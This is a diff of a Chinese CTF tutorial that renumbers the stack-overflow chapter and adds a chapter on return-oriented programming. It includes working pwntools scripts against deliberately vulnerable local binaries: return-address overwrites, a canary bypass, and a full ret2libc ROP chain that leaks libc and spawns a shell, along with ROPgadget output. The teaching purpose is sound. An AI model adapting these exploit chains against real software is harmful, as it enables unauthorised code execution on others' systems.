@@ -6,9 +6,9 @@
 
 # Contents | 例题目录
 
-- [示例-2.3.1.1：简单栈溢出](#示例-2311简单栈溢出)
-- [示例-2.3.1.2：2023网鼎杯pwn16](#示例-23122023网鼎杯pwn16)
-- [示例-2.3.2.1：Canary机制](#示例-2321canary机制)
+- [示例-3.1.1：简单栈溢出](#示例-311简单栈溢出)
+- [示例-3.1.2：2023网鼎杯pwn16](#示例-3122023网鼎杯pwn16)
+- [示例-3.2.1：Canary机制](#示例-321canary机制)
 
 # Assembly-Language | 汇编语言
 
@@ -1531,19 +1531,19 @@ ELF 文件中通常存在 .GOT.PLT 和 .PLT 这两个特殊的节，ELF 编译�
 
 在数组索引的过程中，数组索引还要乘以数组元素的长度来计算元素的实际地址。
 
-### 2.3 栈溢出
+## 第 3 章  栈溢出
 
 栈（stack）特点是以先进后出（First in last out）的方式存取栈中的数据。
 
 函数调用的顺序也是最先调用的函数最后返回，因此栈非常适合保存函数运行过程中使用到的中间变量和其他临时数据。
 
-#### 2.3.1 栈溢出原理
+### 3.1 栈溢出原理
 
 栈溢出是缓冲区溢出的一种。函数的局部变量通常保存在栈上，如果这些缓冲区发生溢出，就是栈溢出。最经典的栈溢出利用方式是覆盖函数的返回地址，以达到劫持程序控制流的目的。
 
 x86 架构中一般使用指令 call 调用一个函数，并使用指令 ret 返回。CPU 在执行 call 指令时，会先将当前 call 指令的下一条指令的地址入栈，再跳转到被调用函数。当被调用函数需要返回时，只需要执行 ret 指令，CPU 会将栈顶地址出栈，并赋值给 EIP 寄存器。
 
-##### 示例-2.3.1.1：简单栈溢出
+#### 示例-3.1.1：简单栈溢出
 
 ```
 #include<stdio.h>
@@ -1598,7 +1598,7 @@ IDA 中 Search Text，查找 `/bin/sh` 字符串，可以得到 shell 函数的�
 通过 pwntools 编辑攻击脚本：
 
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 from pwn import *	# 引入 pwntools 库
 p = process("./stack")	# 运行本地程序 stack
 
@@ -1612,7 +1612,7 @@ p.interactive()	# 切换到直接交互模式
 
 运行脚本，成功获得 shell。
 
-##### 示例-2.3.1.2：2023网鼎杯pwn16
+#### 示例-3.1.2：2023网鼎杯pwn16
 
 打开题目，F5 反编译，跟进函数 `overflow_()`。
 
@@ -1643,14 +1643,14 @@ int overflow_()
 - 32 位程序，使用 p32 而不是 p64。
 
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 from pwn import *
 p = process("./bin16")
 p.sendline("a"*108+p32(0x080485C6).decode('unicode_escape'))
 p.interactive()
 ```
 
-#### 2.3.2 栈保护技术
+### 3.2 栈保护技术
 
 栈溢出利用难度很低，但危害巨大。编译器开发者们引入 Canary 机制来检测栈溢出攻击。
 
@@ -1658,7 +1658,7 @@ Canary 机制在栈保存 RBP 的位置前插入一段随机数，如果攻击�
 
 但 Canary 机制不一定可靠，例如示例 2.3.2.1。
 
-##### 示例-2.3.2.1：Canary机制
+#### 示例-3.2.1：Canary机制
 
 ```c
 #include<stdio.h>
@@ -1703,7 +1703,7 @@ vuln 函数进入是，会从 fs:28 中取出 Canary 的值，放入 rbp-8 的�
 编写攻击脚本：
 
 ```python
-#!/usr/bin/python
+#!/usr/bin/python3
 from pwn import *
 p = process("./stack2")
 p.recv()
@@ -1715,7 +1715,7 @@ p.sendline(b"a"*24+canary +p64(0)+p64(0x4006BD))
 p.interactive()
 ```
 
-#### 2.3.3 常发生栈溢出的危险函数
+### 3.3 常发生栈溢出的危险函数
 
 通过寻找危险函数，可以快速确定程序中是否可能有栈溢出，以及栈溢出的位置。常见的危险函数有包括输入、输出、字符串三种。
 
@@ -1734,7 +1734,7 @@ p.interactive()
 - strcpy()，遇到 `\x00` 停止，不会检查长度，经常容易出现单字节写 0（off by one）溢出；
 - strcat()，同上。
 
-#### 2.3.4 可利用的栈溢出覆盖位置
+### 3.4 可利用的栈溢出覆盖位置
 
 可利用的栈溢出覆盖位置通常有 3 种。
 
@@ -1756,3 +1756,452 @@ ret
 如果栈上的 BP 值被覆盖，那么函数返回后，主调函数的 BP 值会被改变，主调函数返回执行 ret 时， SP 不会指向原来的返回地址位置，而是被修改后的 BP 位置。
 
 第三种，根据现实执行情况，覆盖特定的变量或地址的内容，可能导致一些逻辑漏洞的出现。
+
+## 第 4 章 返回导向式编程
+
+现代操作系统有比较完善的 MPU 机制，可以按照内存页的粒度设置进程的内存使用权限。内存权限分别有可读（R）、可写（W）和可执行（X）。一旦 CPU 执行了没有可执行权限的内存上的代码，操作系统会立即终止程序。
+
+在默认情况下，基于漏洞缓解的规则，程序中不会存在同时具有可写和可执行权限的内存，所以无法通过修改程序的代码段或者数据段来执行任意代码。针对这种漏洞缓解机制，有一种通过返货到程序中特定的指令序列从而控制程序执行流程的攻击技术，被称为返回导向式编程（Return-Oriented Programming，ROP）。
+
+栈溢出通过覆盖返回地址来劫持程序的控制流，并通过 ret 指令跳转到 shell 函数来执行任意命令。正常情况下，程序中不可能存在这种函数。但是，可以利用以 ret（0xc3）指令结尾的指令片段（Gadget）构造一条 ROP 链，来实现任意指令执行，最终实现任意代码执行。
+
+具体步骤为：
+
+- 寻找程序可执行的内存段中所有的 ret 指令，并查看在 ret前的字节是否包含有效指令。
+- 如果包含有效指令，则标记片段为一个可用片段。
+- 找到一系列这样的以 ret 结束的指令后，将这些指令的地址按顺序放在栈上。
+- 每次执行完相应的指令后，其结尾的 ret 指令会将程序控制流传递给栈顶的新的 Gadget 继续执行。
+- 栈上这段连续的 Gadget 构成了一条 ROP 链，从而实现任意指令执行。
+
+### 4.1 寻找 Gadget
+
+在漏洞利用过程中，比较常见的 Gadget 有以下三种类型。
+
+第一种，保存栈数据到寄存器，例如：
+
+```
+pop rax;
+ret;
+```
+
+第二种，系统调用，例如：
+
+```
+syscall;
+ret;
+```
+
+```
+int 0x80;
+ret;
+```
+
+第三种，会影响栈帧的 Gadget，例如：
+
+```
+leave;
+ret;
+```
+
+```
+pop rbp;
+ret;
+```
+
+寻找 Gadget 的方法包括：寻找程序中的 ret 指令，查看 ret 之前有没有所需的指令序列。也可以使用 ROPgadget、Ropper 等工具（更快速）。
+
+- ROPgadget：https://github.com/JonathanSalwan/ROPgadget
+- Ropper：https://github.com/sashs/Ropper
+
+### 4.2 返回导向式编程
+
+```c
+#include<stdio.h>
+#include<unistd.h>
+
+int main(){
+    char buf[10];
+    puts("hello");
+    gets(buf);
+}
+```
+
+用如下命令进行编译：
+
+```
+gcc rop.c -o rop -no-pie -fno-stack-protector
+```
+
+与之前栈溢出所用的例子差别在于，程序中并没有预置可以用来执行命令的函数。
+
+先用 ROPgadget 寻找这个程序中的 Gadget（`--ropchain` 参数自动寻找可用的 Gadget）：
+
+```
+ubuntu@ubuntu:~/Desktop/ROPgadget$ python3 ROPgadget.py --binary rop --ropchain
+```
+
+```
+Gadgets information
+============================================================
+0x00000000004004ae : adc byte ptr [rax], ah ; jmp rax
+0x0000000000400479 : add ah, dh ; nop dword ptr [rax + rax] ; ret
+0x000000000040047f : add bl, dh ; ret
+0x00000000004005dd : add byte ptr [rax], al ; add bl, dh ; ret
+0x00000000004005db : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret
+0x0000000000400437 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x400420
+0x000000000040055d : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
+0x000000000040052c : add byte ptr [rax], al ; add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
+0x00000000004005dc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+0x000000000040052d : add byte ptr [rax], al ; add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
+0x000000000040055e : add byte ptr [rax], al ; add cl, cl ; ret
+0x0000000000400439 : add byte ptr [rax], al ; jmp 0x400420
+0x000000000040055f : add byte ptr [rax], al ; leave ; ret
+0x00000000004004b6 : add byte ptr [rax], al ; pop rbp ; ret
+0x000000000040052e : add byte ptr [rax], al ; push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
+0x000000000040047e : add byte ptr [rax], al ; ret
+0x00000000004004b5 : add byte ptr [rax], r8b ; pop rbp ; ret
+0x000000000040047d : add byte ptr [rax], r8b ; ret
+0x000000000040052f : add byte ptr [rbp + 0x48], dl ; mov ebp, esp ; pop rbp ; jmp 0x4004c0
+0x0000000000400517 : add byte ptr [rcx], al ; pop rbp ; ret
+0x0000000000400560 : add cl, cl ; ret
+0x0000000000400447 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x400420
+0x0000000000400518 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
+0x0000000000400413 : add esp, 8 ; ret
+0x0000000000400412 : add rsp, 8 ; ret
+0x0000000000400478 : and byte ptr [rax], al ; hlt ; nop dword ptr [rax + rax] ; ret
+0x0000000000400434 : and byte ptr [rax], al ; push 0 ; jmp 0x400420
+0x0000000000400444 : and byte ptr [rax], al ; push 1 ; jmp 0x400420
+0x0000000000400409 : and byte ptr [rax], al ; test rax, rax ; je 0x400412 ; call rax
+0x0000000000400410 : call rax
+0x0000000000400442 : fimul dword ptr [rbx] ; and byte ptr [rax], al ; push 1 ; jmp 0x400420
+0x00000000004005bc : fmul qword ptr [rax - 0x7d] ; ret
+0x000000000040047a : hlt ; nop dword ptr [rax + rax] ; ret
+0x0000000000400533 : in eax, 0x5d ; jmp 0x4004c0
+0x000000000040040e : je 0x400412 ; call rax
+0x00000000004004a9 : je 0x4004b8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
+0x00000000004004eb : je 0x4004f8 ; pop rbp ; mov edi, 0x601038 ; jmp rax
+0x000000000040043b : jmp 0x400420
+0x0000000000400535 : jmp 0x4004c0
+0x00000000004006e3 : jmp qword ptr [rbp]
+0x00000000004004b1 : jmp rax
+0x0000000000400561 : leave ; ret
+0x0000000000400432 : loop 0x40043f ; and byte ptr [rax], al ; push 0 ; jmp 0x400420
+0x0000000000400512 : mov byte ptr [rip + 0x200b1f], 1 ; pop rbp ; ret
+0x000000000040055c : mov eax, 0 ; leave ; ret
+0x0000000000400532 : mov ebp, esp ; pop rbp ; jmp 0x4004c0
+0x00000000004004ac : mov edi, 0x601038 ; jmp rax
+0x0000000000400531 : mov rbp, rsp ; pop rbp ; jmp 0x4004c0
+0x00000000004004b3 : nop dword ptr [rax + rax] ; pop rbp ; ret
+0x000000000040047b : nop dword ptr [rax + rax] ; ret
+0x00000000004004f5 : nop dword ptr [rax] ; pop rbp ; ret
+0x0000000000400515 : or esp, dword ptr [rax] ; add byte ptr [rcx], al ; pop rbp ; ret
+0x00000000004005cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005ce : pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005d0 : pop r14 ; pop r15 ; ret
+0x00000000004005d2 : pop r15 ; ret
+0x0000000000400534 : pop rbp ; jmp 0x4004c0
+0x00000000004004ab : pop rbp ; mov edi, 0x601038 ; jmp rax
+0x00000000004005cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004005cf : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004004b8 : pop rbp ; ret
+0x00000000004005d3 : pop rdi ; ret
+0x00000000004005d1 : pop rsi ; pop r15 ; ret
+0x00000000004005cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400436 : push 0 ; jmp 0x400420
+0x0000000000400446 : push 1 ; jmp 0x400420
+0x0000000000400530 : push rbp ; mov rbp, rsp ; pop rbp ; jmp 0x4004c0
+0x0000000000400416 : ret
+0x000000000040040d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x00000000004005e5 : sub esp, 8 ; add rsp, 8 ; ret
+0x00000000004005e4 : sub rsp, 8 ; add rsp, 8 ; ret
+0x00000000004005da : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
+0x000000000040040c : test eax, eax ; je 0x400412 ; call rax
+0x000000000040040b : test rax, rax ; je 0x400412 ; call rax
+
+Unique gadgets found: 74
+
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+	[-] Can't find the 'mov qword ptr [r64], r64' gadget
+
+```
+
+这个程序很小，可供使用的 Gadget 非常有限，其中没有 syscall 这类可以用来执行系统调用的 Gadget，所以很难实现任意代码执行。
+
+针对这种情况，可以想办法先获取一些动态链接库（如 libc）的加载地址，再使用 libc 中的 Gadget 构造可以实现任意代码执行的 ROP。
+
+程序中常常有像 puts、gets 等 libc 提供的库函数，这些函数在内存中的地址会写在程序的 GOT 表中，当程序调用库函数时，会在 GOT 表中读出对应函数在内存中的地址，然后跳转到该地址执行，如下图。
+
+![image-20230427110815451](images/image-20230427110815451.png)
+
+先利用 puts 函数打印库函数的地址，减掉该库函数与 libc 加载基地址的偏移，就可以计算出 libc 的基地址。程序中的 GOT 表如下图。
+
+![image-20230427111014788](images/image-20230427111014788.png)
+
+puts 函数的地址被保存在 0x601018 位置，只要调用 puts(0x601018)，就会打印 puts 函数在 libc 中的地址。
+
+```python
+#!/usr/bin/python3
+from pwn import *
+p=process('./rop')
+
+# pop_rdi=0x4005d3
+# puts_got=0x601018
+# puts=0x400430
+p.sendline(b'a'*18+p64(0x4005d3)+p64(0x601018)+p64(0x400430))
+p.recvuntil('\n')
+
+addr=u64(p.recv(16).ljust(8,b'\x00'))
+print(hex(addr))
+# 0xa7f776dfe46a0
+```
+
+根据 puts 函数在 libc 库中的偏移地址，可以计算出 libc 的基地址，然后利用 libc 中的 Gadget 构造可以执行 `/bin/sh` 的 ROP，从而获得 shell。可以直接调用 libc 中的 system 函数，也可以使用 syscall 系统调用来完成。
+
+以系统调用为例，通过查询系统调用表，可以知道 execve 的系统调用号为 59，想要实现任意命令执行，需要把参数设置为：
+
+```
+execve("/bin/sh", 0, 0)
+```
+
+在 x64 位操作系统上，设置方式为在执行 syscall 前将 rax 设为 59，rdi 设为字符串 `/bin/sh` 的地址，rsi 和 rdx 设为 0。字符串 `/bin/sh` 可以在 libc 中找到，不需要另外构造。
+
+虽然不能直接改写寄存器中的数据，但是可以将要写入寄存器的数据和 Gadget 一起入栈， 将这些数据写入寄存器。Ubuntu 16.04 中 libc 位于 `/lib/x86_64-linux-gnu/libc-2.23.so`，可以从 libc 中找到需要的 Gadget：
+
+```
+ubuntu@ubuntu:~/Desktop/ROPgadget$ python3 ROPgadget.py --binary /lib/x86_64-linux-gnu/libc-2.23.so --ropchain
+```
+
+```
+ROP chain generation
+===========================================================
+
+- Step 1 -- Write-what-where gadgets
+
+	[+] Gadget found: 0x123152 mov qword ptr [rsi], rdi ; ret
+	[+] Gadget found: 0x202f8 pop rsi ; ret
+	[+] Gadget found: 0x21112 pop rdi ; ret
+	[-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'
+
+	[+] Gadget found: 0xe7bfa mov qword ptr [rdx], rdi ; ret
+	[+] Gadget found: 0x1b92 pop rdx ; ret
+	[+] Gadget found: 0x21112 pop rdi ; ret
+	[-] Can't find the 'xor rdi, rdi' gadget. Try with another 'mov [reg], reg'
+
+	[+] Gadget found: 0x9eda4 mov qword ptr [rdx], rcx ; ret
+	[+] Gadget found: 0x1b92 pop rdx ; ret
+	[+] Gadget found: 0xea79a pop rcx ; pop rbx ; ret
+	[-] Can't find the 'xor rcx, rcx' gadget. Try with another 'mov [reg], reg'
+
+	[+] Gadget found: 0x2e1ac mov qword ptr [rdx], rax ; ret
+	[+] Gadget found: 0x1b92 pop rdx ; ret
+	[+] Gadget found: 0x3a738 pop rax ; ret
+	[+] Gadget found: 0x8b945 xor rax, rax ; ret
+
+- Step 2 -- Init syscall number gadgets
+
+	[+] Gadget found: 0x8b945 xor rax, rax ; ret
+	[+] Gadget found: 0xabfc0 add rax, 1 ; ret
+	[+] Gadget found: 0x8f8ab add eax, 1 ; ret
+	[+] Gadget found: 0x6b429 add al, 1 ; ret
+
+- Step 3 -- Init syscall arguments gadgets
+
+	[+] Gadget found: 0x21112 pop rdi ; ret
+	[+] Gadget found: 0x202f8 pop rsi ; ret
+	[+] Gadget found: 0x1b92 pop rdx ; ret
+
+- Step 4 -- Syscall gadget
+
+	[+] Gadget found: 0x26bf syscall
+
+- Step 5 -- Build the ROP chain
+
+#!/usr/bin/env python3
+# execve generated by ROPgadget
+
+from struct import pack
+
+# Padding goes here
+p = b''
+
+p += pack('<Q', 0x0000000000001b92) # pop rdx ; ret
+p += pack('<Q', 0x00000000003c4080) # @ .data
+p += pack('<Q', 0x000000000003a738) # pop rax ; ret
+p += b'/bin//sh'
+p += pack('<Q', 0x000000000002e1ac) # mov qword ptr [rdx], rax ; ret
+p += pack('<Q', 0x0000000000001b92) # pop rdx ; ret
+p += pack('<Q', 0x00000000003c4088) # @ .data + 8
+p += pack('<Q', 0x000000000008b945) # xor rax, rax ; ret
+p += pack('<Q', 0x000000000002e1ac) # mov qword ptr [rdx], rax ; ret
+p += pack('<Q', 0x0000000000021112) # pop rdi ; ret
+p += pack('<Q', 0x00000000003c4080) # @ .data
+p += pack('<Q', 0x00000000000202f8) # pop rsi ; ret
+p += pack('<Q', 0x00000000003c4088) # @ .data + 8
+p += pack('<Q', 0x0000000000001b92) # pop rdx ; ret
+p += pack('<Q', 0x00000000003c4088) # @ .data + 8
+p += pack('<Q', 0x000000000008b945) # xor rax, rax ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000abfc0) # add rax, 1 ; ret
+p += pack('<Q', 0x00000000000026bf) # syscall
+```
+
+这里需要用到的寄存器有 RAX、RDI、RSI、RDX：
+
+```
+p += pack('<Q', 0x000000000003a738) # pop rax ; ret
+p += pack('<Q', 0x0000000000021112) # pop rdi ; ret
+p += pack('<Q', 0x00000000000202f8) # pop rsi ; ret
+p += pack('<Q', 0x0000000000001b92) # pop rdx ; ret
+p += pack('<Q', 0x00000000000026bf) # syscall
+```
+
+泄露库函数地址后，接下来要做的就是控制程序重新执行 main 函数，从而读入并执行新的 ROP 链来实现任意代码执行。完整利用脚本如下：
+
+```python
+#!/usr/bin/python3
+from pwn import *
+p = process('./rop')
+elf = ELF('./rop')
+
+# 导入 libc 库，ubuntu 16.04 中路径为：/lib/x86_64-linux-gnu/libc-2.23.so
+libc = elf.libc
+
+
+# 第一步，找到 puts 函数在 libc 库中的偏移地址
+pop_rdi = 0x4005d3
+puts_got = 0x601018
+puts = 0x400430
+main = 0x400537
+rop1 = b"a" * 18        # char[10] + 寄存器[8] = 18
+rop1 += p64(pop_rdi)    # rdi 寄存器地址
+rop1 += p64(puts_got)   # .got.plt 表中存放的 _puts 的真实地址
+rop1 += p64(puts)   # .plt 表中 _puts 项的地址
+rop1 += p64(main)   # main 函数地址
+p.sendline(rop1)
+p.recvuntil('\n')
+addr = u64(p.recv(6).ljust(8,b'\x00'))  # u64 将字符传唤为数字
+
+
+# 第二步，计算 libc 基地址
+libc_case = addr - libc.symbols['puts'] # 计算 libc 的基地址
+info("libc:0x%x", libc_case)    # 16 进制输出
+
+# 第三步，在 libc 中寻找相应的寄存器，将参数设置为 execve("/bin/sh",0,0)
+# 需要用到 rax、rdi、rsi、rdx 寄存器
+pop_rax = 0x000000000003a738 + libc_case # pop rax ; ret
+pop_rdi = 0x0000000000021112 + libc_case # pop rdi ; ret
+pop_rsi = 0x00000000000202f8 + libc_case # pop rsi ; ret
+pop_rdx = 0x0000000000001b92 + libc_case # pop rdx ; ret
+syscall = 0x00000000000026bf + libc_case # syscall
+
+# 第四步，搜索 libc 中 /bin/sh 字符串的地址
+binsh =  next(libc.search(b"/bin/sh"),) + libc_case
+
+# 第五步，设置参数为 execve("/bin/sh",0,0)
+# 在 x64 位操作系统上，参数设置方式为：
+# 1. 在执行 syscall 前将 rax 设为 59
+# 2. rdi 设为字符串 /bin/sh 的地址（/bin/sh 可以在 libc 中找到，不需要另外构造）
+# 3. rsi 和 rdx 设为 0
+rop2 = b"a" * 18
+rop2 += p64(pop_rax)
+rop2 += p64(59)
+rop2 += p64(pop_rdi)
+rop2 += p64(binsh)
+rop2 += p64(pop_rsi)
+rop2 += p64(0)
+rop2 += p64(pop_rdx)
+rop2 += p64(0)
+rop2 += p64(syscall)
+
+p.recvuntil("hello\n")
+p.sendline(rop2)
+p.interactive()
+```
+
+运行结果：
+
+```bash
+ubuntu@ubuntu:~/Desktop/PWN$ python rop.py 
+[+] Starting local process './rop': pid 4296
+[*] '/home/ubuntu/Desktop/PWN/rop'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/lib/x86_64-linux-gnu/libc-2.23.so'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+  p.recvuntil('\n')
+[*] libc:0x7f10cc852000
+  p.recvuntil("hello\n")
+[*] Switching to interactive mode
+$ id
+uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
+```
+
+#### 
